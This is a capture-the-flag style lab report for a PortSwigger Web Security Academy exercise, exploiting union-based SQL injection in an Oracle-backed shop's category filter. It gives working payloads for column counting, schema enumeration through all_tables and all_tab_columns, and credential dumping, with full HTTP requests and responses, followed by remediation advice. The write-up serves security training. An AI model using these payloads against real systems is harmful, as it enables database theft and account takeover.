# PortSwigger Web Security Academy Lab Report  SQL Injection Attack: Listing the Database Contents on Oracle


**Report ID:** PS-LAB-006

**Author:** Abhiram (Abhi)  

**Date:** February 07, 2026 
 
**Lab Level:** Practitioner  

**Lab Title:** SQL injection attack, listing the database contents on Oracle


## Executive Summary

**Vulnerability Type:** SQL Injection (Union-based)  

**Severity:** High (CVSS 3.1 Score: 8.6 – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:** A SQL injection vulnerability exists in the `category` parameter of the `/filter` endpoint on a simulated e-commerce site. Query results are reflected in the response, enabling UNION attacks to enumerate Oracle database contents. Exploitation involved determining column count, querying `all_tables`/`all_tab_columns` for schema info (using `DUAL` dummy table), and extracting usernames/passwords from the users table to log in as `administrator`.

**Impact:** Full database enumeration, credential theft, account takeover, potential privilege escalation or data modification in production.

**Status:** Exploited only in controlled lab environment; no real-world impact. Educational report only.


## Environment and Tools Used:

**Target:** PortSwigger Web Security Academy lab (e.g., `https://*.web-security-academy.net`)  

**Browser:** Google Chrome (Version 120.0 or similar)  

**Tools:**  Burp Suite Community Edition (Version 2023.12 or similar) – interception, modification, analysis  

**Operating System:** Windows 11  

**Test Date/Time:** February 07, 2026, approximately 05:59 PM IST



## Methodology:

Ethical hacking best practices in simulated environment.

1. Accessed lab via "Access the lab".  
2. Configured base URL in Burp Suite target scope.  
3. Intercepted `GET /filter?category=...` request in Burp Proxy.  
4. Tested injection: `category='` → SQL error confirmed vulnerability.  
5. Found column count: `' UNION SELECT NULL,NULL FROM DUAL--` (increment NULLs until success).  
6. Listed tables: `' UNION SELECT table_name,NULL FROM all_tables--`  
7. Found columns in users table: `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--` (or similar table name).  
8. Dumped credentials: `' UNION SELECT username,password FROM users--` (adjusted for actual table/columns).  
9. Logged in as `administrator` with retrieved password.



## Detailed Findings:

**Vulnerable Endpoint:** `GET /filter?category=...`

**Original Request:**

```http
GET /filter?category=Gifts HTTP/1.1
Host: *.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
…


Injection Test (Error):

GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_THXZBT'-- HTTP/2
Host: 0ae1006f0480e11d809f0d36000d00e1.web-security-academy.net
Cookie: session=n1PwH74eZsSwfcvTfUtWyWrNcxEy1Cis
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
…


Response: 

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3952

<!DOCTYPE html>
<html>
<head>
    <title>SQL injection attack, listing the database contents on Oracle</title>
</head>
<body>
    <h1>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--</h1>
    <!-- Lab header, navigation, search filters, empty table -->
</body>
</html>


Successful UNION Dump:

GET /filter?category='+UNION+SELECT+USERNAME_NDBNBE,PASSWORD_GQDHCO+FROM+USERS_THXZBT-- HTTP/2
Host: 0ae1006f0480e11d809f0d36000d00e1.web-security-academy.net
Cookie: session=n1PwH74eZsSwfcvTfUtWyWrNcxEy1Cis
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8
...


Response:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 4413

<!DOCTYPE html>
<html>
<head>
    <title>SQL injection attack, listing the database contents on Oracle</title>
</head>
<body>
    <h1>' UNION SELECT USERNAME_NDBNBE, PASSWORD_GQDHCO FROM USERS_THXZBT--</h1>
    
    <table>
        <tr><th>administrator</th><td>q3vp0bv6am38jz1k7ows</td></tr>
        <tr><th>carlos</th><td>7matvho48c173d2yo0mo</td></tr>
        <tr><th>wiener</th><td>aettlohko3d03sbbc8wh</td></tr>
    </table>
</body>
</html>



Proof of Exploitation:


![Proof of SQL Injection Error](https://github.com/abhiram507/PortSwigger-SQLI-Lab-6/blob/724e9d07dd7d2e0de30812ac55d59043c5ca9a43/Portswigger%20Lab%206%20error.jpg)

Figure 1: SQL error after single quote injection.


![Proof of Successful Exploitation](https://github.com/abhiram507/PortSwigger-SQLI-Lab-6/blob/34de04c6ce5d2e011840e4605b203b21925b0446/Portswigger%20Lab%206%20success.jpg)

Figure 2: PortSwigger "Congratulations, you solved the lab!"


![Lab Solved Congratulations]()
Figure 3: Portswigger Lab Completed 



Exploitation Explanation:

Query like SELECT title, description FROM products WHERE category = '[input]'.
' closes string → error.
UNION SELECT ... FROM DUAL-- appends data (Oracle requires FROM clause; DUAL is dummy table).
Enumerated schema with all_tables / all_tab_columns.
Final: ' UNION SELECT username,password FROM users-- dumps creds.



Risk Assessment:

Likelihood: High (reflected results, no sanitization).
Impact: Critical – credential theft, takeover.
Affected: Oracle backend database.



Recommendations for Remediation:

Use prepared statements / parameterized queries.
Strict input validation / sanitization.
Deploy WAF for SQLi/UNION detection.
Least privilege for app DB accounts.
Regular code reviews + scanning (Burp, OWASP ZAP, sqlmap).



Conclusion and Lessons Learned:

Demonstrated union-based SQLi on Oracle: column count, schema enumeration via all_* views, credential extraction.

Key Takeaways:

Oracle needs FROM DUAL in blind UNION.
Use all_tables/all_tab_columns for enumeration.
Enhanced payload crafting and Oracle-specific SQLi skills.



References:

PortSwigger Academy: SQL Injection
Lab: SQL injection attack, listing the database contents on Oracle
